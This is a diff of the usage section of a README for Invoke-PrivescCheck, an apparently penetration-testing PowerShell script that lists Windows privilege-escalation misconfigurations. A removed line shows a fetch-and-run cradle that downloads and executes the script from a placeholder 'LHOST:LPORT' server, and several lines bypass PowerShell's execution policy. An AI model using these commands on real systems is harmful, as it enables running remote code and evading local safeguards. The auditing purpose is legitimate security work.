@@ -4,27 +4,27 @@ This script aims to __enumerate common Windows security misconfigurations__ whic
 
 I built on the amazing work done by [@harmj0y](https://twitter.com/harmj0y) and [@mattifestation](https://twitter.com/mattifestation) in [PowerUp](https://github.com/HarmJ0y/PowerUp). I added more checks and also tried to reduce the amount of false positives.
 
+
 ## Usage 
 
-Use the script from a PowerShell prompt.
+By default, the srcipt runs only "quick-win" checks. To get extra information, use the option `-Extended`.
+
+From a PowerShell prompt:
 ```
-PS C:\Temp\> Set-ExecutionPolicy Bypass -Scope Process -Force 
 PS C:\Temp\> . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck 
+PS C:\Temp\> . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck -Extended
 ```
 
-Display output and write to a log file at the same time.
+From a PowerShell prompt + Log results to a file:
 ```
-PS C:\Temp\> . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck | Tee-Object "C:\Temp\result.txt"
+PS C:\Temp\> . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck | Tee-Object "result.txt"
+PS C:\Temp\> . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck -Extended | Tee-Object "result.txt"
 ```
 
-Use the script from a CMD prompt.
+From a command prompt:
 ```
 C:\Temp\>powershell -ep bypass -c ". .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck | Tee-Object result.txt"
-```
-
-Import the script from a web server.
-```
-C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/Invoke-PrivescCheck.ps1'); Invoke-PrivescCheck" 
+C:\Temp\>powershell -ep bypass -c ". .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck -Extended | Tee-Object result.txt"
 ```
 
 
